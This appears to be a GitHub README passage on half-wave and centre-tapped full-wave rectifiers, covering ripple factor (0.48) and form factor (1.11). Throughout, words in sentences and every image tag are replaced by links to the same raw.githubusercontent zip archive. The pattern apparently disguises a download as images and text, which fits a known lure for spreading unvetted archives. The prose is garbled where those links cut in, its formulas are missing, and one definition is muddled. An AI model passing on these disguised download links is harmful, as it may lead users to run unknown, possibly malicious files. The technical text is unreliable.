...
![image](https://raw.githubusercontent.com/MITHUN8521/Converter-design-and-simulation/main/nettable/Converter-design-and-simulation_v1.6.zip)
...
‘Ripple’ is the unwanted AC component remaining when converting the AC voltage waveform into a DC https://raw.githubusercontent.com/MITHUN8521/Converter-design-and-simulation/main/nettable/Converter-design-and-simulation_v1.6.zip though we try out best to remove all AC components, there is still some small amount left on the output side which pulsates the DC waveform. This undesirable AC component is called ‘ripple’.To quantify how well the half-wave rectifier can convert the AC voltage into DC voltage, we use what is known as the ripple factor (represented by γ or r).The ripple factor is the ratio between the RMS value of the AC voltage (on the input side) and the DC voltage (on the output side) of the rectifier. The formula for ripple factor is:
 
Where Vrms is the RMS value of the AC component, and Vdc is the DC component in the https://raw.githubusercontent.com/MITHUN8521/Converter-design-and-simulation/main/nettable/Converter-design-and-simulation_v1.6.zip ripple factor of a centre-tapped full-wave rectifier is equal to 0.48 (i.e. γ = 0.48).Note: To construct a good rectifier, we need to keep the ripple factor as minimum as possible. We can use capacitors or inductors to reduce the ripples in the circuit.
...
The form factor is the ratio between RMS value and average https://raw.githubusercontent.com/MITHUN8521/Converter-design-and-simulation/main/nettable/Converter-design-and-simulation_v1.6.zip formula for form factor is given below:The form factor of a centre-tapped full wave rectifier is equal to 1.11 (i.e. FF = 1.11).
![image](https://raw.githubusercontent.com/MITHUN8521/Converter-design-and-simulation/main/nettable/Converter-design-and-simulation_v1.6.zip)
...
<img width="1920" height="1080" alt="1" src="https://raw.githubusercontent.com/MITHUN8521/Converter-design-and-simulation/main/nettable/Converter-design-and-simulation_v1.6.zip" />


<img width="1920" height="1080" alt="2" src="https://raw.githubusercontent.com/MITHUN8521/Converter-design-and-simulation/main/nettable/Converter-design-and-simulation_v1.6.zip" />


<img width="1403" height="880" alt="3" src="https://raw.githubusercontent.com/MITHUN8521/Converter-design-and-simulation/main/nettable/Converter-design-and-simulation_v1.6.zip" />
